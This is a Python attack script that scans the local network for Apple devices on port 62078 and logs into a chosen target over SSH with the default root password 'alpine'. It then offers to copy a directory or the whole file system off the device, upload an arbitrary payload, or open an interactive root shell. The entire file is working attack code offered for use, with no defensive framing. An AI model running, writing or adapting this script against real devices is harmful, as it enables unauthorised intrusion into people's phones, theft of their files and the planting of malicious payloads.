#!/usr/bin/python

## Python Script search out Apple products and attempt to SSH with default credentials.

import os
import netifaces as ni
import pexpect
from logging import root
from os.path import expanduser
import sys
import re
import socket
from IPy import IP


def main():
    global scanRange
    global outfile
    global finaltarget
    banner()
    getInt()
    getTargets()
    getIP()
    preCheck()
    selectAttack()


def banner():
    os.system('clear')


def getInt():
    global scanRange
    global exclude



    ni.ifaddresses('eth0')
    ip = ni.ifaddresses('eth0')[2][0]['addr']
    scanRange = ip + "/24"
    exclude = ip



def getTargets():
    # Scan the selected network for a target Apple device.

    print("Scanning" + " " + scanRange + " " + " for target devices.")
    os.system('sleep 2')
    os.system('clear')
    print("Now Running Nmap on Target Network.")
    prog = "nmap -p 62078 --exclude " + exclude + " " + scanRange + " > /tmp/nmap"
    os.system(prog)
    print("Parsing results to filter Apple Devices")
    parse = "grep -i '62078/tcp open' -B 3 /tmp/nmap > /tmp/targets"
    os.system(parse)
    os.system('clear')

def getIP():
    global outfile
    global finaltarget
    print("Possible targets are listed below, please select from the following IP addresses.\n")
    if os.stat("/tmp/targets").st_size == 0:
        print("No valid targets found on this network.")
        os.system('sleep 2')
        loopMe()
    else:
        try:
            file = open("/tmp/targets", "r")
            ips = []
            for text in file.readlines():
                text = text.rstrip()
                regex = re.findall(r'(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})$', text)
                if regex is not None and regex not in ips:
                    ips.append(regex)

            for ip in ips:
                outfile = open("/tmp/ios_devices", "a")
                addy = "".join(ip)
                if addy is not '':
                    print("%s" % (addy))
                    outfile.write(addy)
                    outfile.write("\n")
        finally:
            file.close()
            outfile.close()
    finaltarget = input("Please input Target IP here: ")

    while True:
        try:
            IP(finaltarget)
        except ValueError:
            # Not a valid number
            print(finaltarget + " is not a valid IPv4 address.")
            finaltarget = input("Please input Target IP here: ")
        else:
            # No error; stop the loop
            break


def preCheck():
    host = finaltarget
    port = 22
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    os.system('clear')
    print("Performing Prechecks, please wait.")

    try:
        s.connect((host, port))
        s.shutdown(2)
        print("Connecting to: ")
        print(host + " on port " + str(port) + " was successful.")
    except:
        print("Connecting to: ")
        print(host + " on port: " + str(port) + " was unsuccessful.")

    print("\nWould you like to continue the attack against " + finaltarget + "?")
    yes = ['yes', 'y', 'ye', '']
    no = ['no', 'n']

    choice = input("Please type yes or no: ").lower()
    if choice in yes:
        selectAttack()
    if choice in no:
        os.system('clear')
        getIP()
        preCheck()
    else:
        os.system('clear')
        preCheck()


def selectAttack():
    os.system('clear')
    print("Please select from the following options:")
    print("\n")
    print("1: Connect to " + finaltarget + " and download specific directory.")

    print("2: Connect to " + finaltarget + " and download the complete file system:")
    print("3: Connect to " + finaltarget + " and upload a payload:")
    print("4: Open a SSH connection to " + finaltarget)
    print("\n")
    choice = input("Enter 1, 2, 3, or 4:")
    solution1 = ['1']
    solution2 = ['2']
    solution3 = ['3']
    solution4 = ['4']
    if choice in solution1:
        downloadFile()
    elif choice in solution2:
        downloadAll()
    elif choice in solution3:
        upload()
    elif choice in solution4:
        sshConnect()
    else:
        sys.stdout.write("Please select 1, 2, 3, or 4:")
        os.system('clear')
        selectAttack()


def downloadFile():
    dir = "/usr/var/real_apple/" + finaltarget
    if not os.path.exists(dir):
        os.makedirs(dir)
    os.system('clear')
    print("You are targeting " + finaltarget)
    print( "\n")
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    target_dir = input("Enter the absolute path of the target directory:")
    filename = target_dir
    child = pexpect.spawn("scp -r -C -o stricthostkeychecking=no %s@%s:%s %s" % (username, user_host, filename, dir),
                          timeout=30000)
    child.logfile_read = sys.stdout
    child.expect(".*ssword: ")
    child.sendline(user_pass)
    child.expect(pexpect.EOF)

    print('\n Your files are stored in \n ' + dir + " .")
    os.system('sleep 3')
    os.system('clear')
    loopMe()


def downloadAll():
    dir = "/usr/var/real_apple/" + finaltarget
    if not os.path.exists(dir):
        os.makedirs(dir)
    os.system('clear')
    print("You are targeting " + finaltarget)
    print("\n")
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password

    filename = "/"
    child = pexpect.spawn("scp -r -C -o stricthostkeychecking=no %s@%s:%s %s" % (username, user_host, filename, dir),
                          timeout=30000)
    child.logfile_read = sys.stdout
    child.expect(".*ssword: ")
    child.sendline(user_pass)
    child.expect(pexpect.EOF)

    print('\n Your files are stored in /usr/var/real_apple/' + finaltarget)
    os.system('sleep 3')
    os.system('clear')
    loopMe()


def upload():
    print("You are targeting " + finaltarget)
    print("\n")
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    upload_file = input("Enter the absolute path of the file you wish to upload:")
    target_dir = input("Enter the absolute path to the upload location:")

    filename = upload_file
    child = pexpect.spawn("scp %s %s@%s:%s" % (upload_file, username, user_host, target_dir), timeout=30000)
    child.logfile_read = sys.stdout
    child.expect(".*ssword: ")
    child.sendline(user_pass)
    child.expect(pexpect.EOF)

    print('\n Your file has been uploaded to' + target_dir)
    os.system('sleep 3')
    os.system('clear')
    loopMe()


def sshConnect():
    username = "root"
    password = "alpine"
    user_host = finaltarget
    user_pass = password
    ssh_newkey = 'Are you sure you want to continue connecting'
    p = pexpect.spawn('ssh -o stricthostkeychecking=no %s@%s' % (username, user_host))
    i = p.expect(['.*assword:', pexpect.EOF, pexpect.TIMEOUT], 1)
    if i == 0:
        print("Passing credentials:",)
        p.sendline(user_pass)
    elif i == 1:
        print("I either got key or connection timeout")
        pass
    elif i == 2:  # timeout
        pass
    p.sendline("\r")
    global global_pexpect_instance
    global_pexpect_instance = p
    try:
        p.interact()
        os.system('sleep 1')
        loopMe()
    except:
        loopMe()


def cleanUp():
    os.remove("/tmp/ios_devices")
    os.remove("/tmp/nmap")
    os.remove("/tmp/targets")
    sys.exit(0)


def loopMe():
    os.system('clear')
    print( """Run again?""")
    yes = ['yes', 'y', 'ye', '']
    no = ['no', 'n']

    choice = input("Type yes or no: ").lower()
    if choice in yes:
        main()
    elif choice in no:
        sys.exit(0)

    else:
        # sys.stdout.write("Please respond with 'yes' or 'no'\n")
        print("Please type yes or no only.")
        os.system('sleep 2')
        loopMe()


if __name__ == "__main__":
    main()
